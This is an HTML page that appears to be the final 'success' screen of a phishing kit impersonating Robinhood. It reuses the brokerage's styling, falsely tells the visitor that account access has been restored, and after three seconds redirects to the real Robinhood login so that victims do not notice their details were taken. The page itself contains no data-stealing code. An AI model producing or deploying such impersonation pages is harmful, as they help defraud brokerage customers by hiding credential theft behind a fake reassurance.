<html lang="en-US" dir="ltr">
<head>
<meta charset="utf-8">
<meta http-equiv="REFRESH" content="3;url=https://robinhood.com/login">
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
<link rel="shortcut icon" href="img/167EWkdKrN2X6Jqp7LEO9o.ico">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/legacyStyles.8a7c8392c805eaaf82a4.css" type="text/css" media="all" data-id="legacy-styles">
<link rel="stylesheet" href="https://cdn.robinhood.com/assets/generated_assets/App.8a7c8392c805eaaf82a4.css" type="text/css" media="all">
<link rel="stylesheet" type="text/css" href="css/a.css">
<title>Thank you! | Robinhood</title>
</head>
<body class="theme-open-up">
<div id="react_root">
	<div>
		<div class="css-10d7enp">
						<div class="css-slob1f">
							<div>
								<center>
								<form class="_17_I0wDhYhTnsfNxPR0_CF up">
									<img src="img/success.png" width="150">
									<header class="css-240zvz"><span class="css-1wyk9uc">Thank you! Access to your robinhood account has been restored.</span></header>
									<div class="css-16x6d1u">
										<div>
										<p aria-live="assertive">
											<div class="_2QawT-EkOq7gIQN1hHcFqU" style="height: 0px; transition-duration: 300ms;">
												<div class="_3UC6vIw0Z8kgiibABGCPT2">
													<div></div>
												</div>
											</div>
										</p>
									</div>
								</form>
								</center>
							</div>
						</div>
					</div>
				</div>
			</div>
</div>
</body>
</html>